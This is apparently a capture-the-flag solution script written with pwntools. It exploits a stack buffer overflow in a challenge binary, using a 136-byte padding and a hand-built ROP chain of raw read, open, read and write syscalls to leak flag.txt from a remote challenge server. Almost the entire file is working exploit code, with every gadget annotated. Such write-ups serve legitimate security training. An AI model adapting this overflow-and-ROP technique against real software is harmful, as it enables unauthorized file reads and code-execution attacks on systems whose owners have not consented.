from pwn import *

context.binary = elf = ELF('./chal')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('challenge.utctf.live', 5141)
elif args.GDB:
    r = gdb.debug('./chal', gdbscript='''
                            b *main + 145
                            continue
    ''')
else:
    r = process('./chal')


payload = b'a'*136 + flat([
    # write ./flag.txt in the bss

    0x450507,   # pop rax; ret;
    p64(0),     # syscall code for read
    0x40204f,   # pop rdi; ret;
    p64(0),     # fd of stdin
    0x40a0be,   # pop rsi; ret;
    0x4C82C0,   # bss buffer
    0x48630b,   # pop rdx; pop rbx; ret;
    p64(512),   # number of bytes to read
    p64(0),     # dummy value for rbx
    0x41ae16,   # syscall; ret;

    # open the file
    0x450507,   # pop rax; ret;
    p64(2),     # syscall code for open
    0x40204f,   # pop rdi; ret;
    0x4C82C0,   # bss buffer where ./flag.txt is stored
    0x40a0be,   # pop rsi; ret;
    p64(0),     # readonly mode
    0x48630b,   # pop rdx; pop rbx; ret;
    p64(0),     # additional mode, set to 0
    p64(0),     # dummy value for rbx
    0x41ae16,   # syscall; ret;

    # read contents to buffer
    0x4662c2,   # mov rdi, rax; cmp rdx, rcx; jae 0x662ac; mov rax, r8; ret; (moves the file descriptor to rdi and doesn't jump because rdx is less than rcx)
    0x450507,   # pop rax; ret;
    p64(0),     # syscall code for read
    0x40a0be,   # pop rsi; ret;
    0x4C82C0,   # bss buffer
    0x48630b,   # pop rdx; pop rbx; ret;
    p64(50),    # number of bytes to read
    p64(0),     # dummy value for rbx
    0x41ae16,   # syscall; ret;

    # print content to stdout
    0x450507,   # pop rax; ret;
    p64(1),     # syscall code for write
    0x40204f,   # pop rdi; ret;
    p64(1),     # fd of stdout
    0x40a0be,   # pop rsi; ret;
    0x4C82C0,   # bss buffer
    0x48630b,   # pop rdx; pop rbx; ret;
    p64(50),    # number of bytes to write
    p64(0),     # dummy value for rbx
    0x41ae16,   # syscall; ret;

    # peacefully exit
    0x450507,   # pop rax; ret;
    p64(60),    # syscall code for exit
    0x40204f,   # pop rdi; ret;
    p64(0),     # exit code
    0x41ae16    # syscall; ret;
])

r.sendlineafter(b'> ', payload)
r.sendlineafter(b'Flag: ', b'./flag.txt\x00')

print(r.recvline().strip().decode())
r.close()